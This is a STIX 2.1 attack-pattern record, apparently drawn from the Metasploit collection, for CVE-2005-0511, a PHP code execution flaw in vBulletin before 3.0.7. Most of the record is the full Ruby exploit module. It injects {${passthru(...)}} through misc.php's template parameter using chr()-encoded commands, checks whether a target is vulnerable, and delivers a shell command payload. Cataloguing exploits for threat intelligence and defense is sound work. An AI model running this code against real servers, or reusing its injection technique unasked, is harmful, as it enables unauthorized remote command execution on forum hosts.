{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ad56e393-90aa-4892-8b51-b3fce3c5c29a",
    "created": "2024-08-14T17:14:04.111869Z",
    "modified": "2024-08-14T17:14:04.111874Z",
    "name": "vBulletin misc.php Template Name Arbitrary Code Execution",
    "description": " This module exploits an arbitrary PHP code execution flaw in the vBulletin web forum software. This vulnerability is only present when the \"Add Template Name in HTML Comments\" option is enabled. All versions of vBulletin prior to 3.0.7 are affected. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/php_vbulletin_template.rb",
            "external_id": "php_vbulletin_template.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-0511"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  # XXX This module needs an overhaul\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'vBulletin misc.php Template Name Arbitrary Code Execution',\n      'Description'    => %q{\n          This module exploits an arbitrary PHP code execution flaw in\n        the vBulletin web forum software. This vulnerability is only\n        present when the \"Add Template Name in HTML Comments\" option\n        is enabled. All versions of vBulletin prior to 3.0.7 are\n        affected.\n      },\n      'Author'         =>\n        [\n          'str0ke <str0ke[at]milw0rm.com>',\n          'cazz'\n        ],\n      'License'        => BSD_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-0511' ],\n          [ 'BID', '12622' ],\n          [ 'OSVDB', '14047' ],\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'       => 512,\n          'DisableNops' => true,\n          'Keys'        => ['cmd', 'cmd_bash'],\n        },\n      'Targets'        => [ ['Automatic', { }], ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2005-02-25'\n      ))\n\n    register_options(\n      [\n        OptString.new('PATH', [ true,  \"Path to misc.php\", '/forum/misc.php']),\n      ])\n\n    deregister_options(\n      'HTTP::junk_slashes' # For some reason junk_slashes doesn't always work, so turn that off for now.\n    )\n  end\n\n  def go(command)\n    wrapper = rand_text_alphanumeric(rand(128)+32)\n\n    command = \"echo #{wrapper};#{command};echo #{wrapper};\"\n    encoded = command.unpack(\"C*\").collect{|x| \"chr(#{x})\"}.join('.')\n\n    res = send_request_cgi({\n        'uri'      => datastore['PATH'],\n        'method'   => 'GET',\n        'vars_get' =>\n          {\n            'do' => \"page\",\n            'template' => \"{${passthru(#{encoded})}}\"\n          }\n      }, 5)\n\n    if (res and res.body)\n      b = /#{wrapper}[\\s\\r\\n]*(.*)[\\s\\r\\n]*#{wrapper}/sm.match(res.body)\n      if b\n        return b.captures[0]\n      elsif datastore['HTTP::chunked']\n        b = /chunked Transfer-Encoding forbidden/.match(res.body)\n        if b\n          fail_with(Failure::Unknown, 'Target PHP installation does not support chunked encoding. Support for chunked encoded requests was added to PHP on 12/15/2005. Try disabling HTTP::chunked and trying again.')\n        end\n      end\n    end\n\n    return nil\n  end\n\n  def check\n    response = go(\"echo ownable\")\n    if (!response.nil? and response =~ /ownable/sm)\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    response = go(payload.encoded)\n    if response == nil\n      print_error('exploit failed: no response')\n    else\n      if response.length == 0\n        print_good('Exploit Successful')\n      else\n        print_status(\"Command returned #{response}\")\n      end\n      handler\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-02-25",
    "x_mitre_platforms": [
        "['unix']"
    ]
}